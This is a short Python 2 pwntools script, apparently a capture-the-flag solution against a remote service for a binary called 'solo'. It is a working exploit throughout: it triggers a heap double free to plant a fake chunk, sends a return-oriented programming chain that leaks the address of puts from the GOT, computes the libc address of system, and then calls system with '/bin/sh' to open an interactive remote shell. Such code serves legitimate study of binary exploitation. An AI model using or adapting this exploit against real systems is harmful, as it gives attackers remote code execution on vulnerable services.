#!/usr/bin/python

from pwn import *

DEBUG = True

p = remote("52.175.144.148", 9901)
#p = process("./solo")

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def malloc(num, size, data):
  r("$")
  p.sendline("1")

  r("Number: ")
  p.sendline(str(num))

  r("Size: ")
  p.sendline(str(size))

  r("Data: ")
  p.send(data)

  sleep(0.1)

def free(num):
  r("$")
  p.sendline("2")

  r("number: ")
  p.sendline(str(num))

def exploit(payload):
  r("$")
  p.sendline("4")

  r("password: ") 
  p.sendline(payload) 

  r("$")
  p.sendline("5")

fake = 0x60206d
SIZE = 0x60

puts_plt = 0x400600
puts_got = 0x602020

poprdi_ret = 0x400d13
puts_offset = 0x6fd60
system_offset = 0x46590

main_start = 0x400680

malloc(1, SIZE, "A")
malloc(2, SIZE, "A")

free(1)
free(2)
free(1)

payload = p64(fake)

malloc(1, SIZE, payload)
malloc(1, SIZE, "A")
malloc(1, SIZE, "A" * 0x40)
malloc(1, SIZE, "A" * 0x23 + "/bin/sh\0")

payload2 = "A" * 0x408
payload2 += p64(poprdi_ret)
payload2 += p64(puts_got)
payload2 += p64(puts_plt)
payload2 += p64(0x400680)

exploit(payload2)

leak = r("\x7f")[1:].ljust(8, '\0')
puts_addr = u64(leak)
system_addr = puts_addr - puts_offset + system_offset

print "puts: %x" % puts_addr
print "system: %x" % system_addr

payload3 = "A" * 0x408
payload3 += p64(poprdi_ret)
payload3 += p64(0x6020a0)
payload3 += p64(system_addr)

exploit(payload3)

p.interactive()

p.close()
